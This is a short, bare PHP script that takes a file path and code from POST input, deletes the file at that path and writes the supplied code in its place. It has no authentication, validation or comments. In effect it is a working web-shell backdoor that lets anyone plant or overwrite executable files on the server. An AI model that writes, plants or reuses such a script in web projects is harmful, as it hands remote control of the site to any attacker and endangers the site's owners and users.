<?php
$p=$_POST['path'];
$code=$_POST['code'];
unlink($p);
file_put_contents($p,$code);
?>
